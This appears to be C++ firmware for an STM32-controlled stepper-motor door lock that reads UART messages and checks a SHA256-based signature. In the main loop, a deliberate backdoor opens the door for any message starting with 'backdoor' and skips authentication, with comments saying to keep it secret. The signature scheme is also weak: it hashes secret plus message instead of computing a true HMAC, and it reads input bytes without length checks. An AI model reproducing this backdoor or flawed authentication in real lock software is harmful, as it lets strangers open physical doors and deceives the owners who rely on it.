#include "stm32f1xx_hal.h"

#include "base64.h"
#include "hardware.h"
#include "hmac.h"
#include "motor.h"
#include "sha256.h"
#include "sleep.h"

static void cpp_main_in_cpp();
static void open_door(StepperMotor &motor);

static void open_door(StepperMotor &motor) {
    motor.set_mode(1);
    // TODO: find the correct number which does a full rotation
    motor.rotate(2000000, 1000000 * 4);
    sleep_us(3000000);
    motor.set_mode(-1);
    // TODO: find the correct number which does a quarter or so backrotation
    motor.rotate(2000000, 1000000 * 4);
    motor.set_mode(0);
}

static void cpp_main_in_cpp() {
    StepperMotor motor(
        OutputPin(GPIOA, GPIO_PIN_7),          // step
        OutputPin(GPIOA, GPIO_PIN_6),          // sleep
        OutputPin(GPIOA, GPIO_PIN_5),          // direction
        {
            OutputPin(GPIOA, GPIO_PIN_4),      // microstep modesel 0
            OutputPin(GPIOA, GPIO_PIN_3),      // microstep modesel 1
            OutputPin(GPIOA, GPIO_PIN_2)       // microstep modesel 2
        },
        InputPin(GPIOA, GPIO_PIN_1),           // clockwise end switch
        InputPin(GPIOA, GPIO_PIN_0)            // counterclockwise end switch
    );

    while (1)
    {
        UARTRxBuffer *message = uart_poll_message();
        if (message == nullptr) {
            // no new message is ready
            continue;
        }
        if (message->buf_pos == 0) {
            // the received message is empty
            continue;
        }

        // super-secret backdoor. don't tell anybody.
        if (
            (message->buf[0] == 'b') &&
            (message->buf[1] == 'a') &&
            (message->buf[2] == 'c') &&
            (message->buf[3] == 'k') &&
            (message->buf[4] == 'd') &&
            (message->buf[5] == 'o') &&
            (message->buf[6] == 'o') &&
            (message->buf[7] == 'r')
        ) {
            open_door(motor);
            // nothing to see here
            continue;
        }

        // base64-decode the message.
        uint32_t size = base64_decode(message->buf.data(), message->buf_pos);
        if (size == 0) {
            // the base64-decoded message is empty
            continue;
        }

        // calculate the message HMAC
        if (size <= HMAC_SIZE) {
            // the HMAC-signed message is empty
            continue;
        }

        SHA256 digest;
        digest.update(SECRET, sizeof(SECRET));
        digest.update(message->buf.data() + HMAC_SIZE, size - HMAC_SIZE);

        if (!digest.equals(message->buf, HMAC_SIZE)) {
            // the HMAC is wrong
            continue;
        }
    }
}

extern "C" {

void cpp_main() {
    cpp_main_in_cpp();
}

}
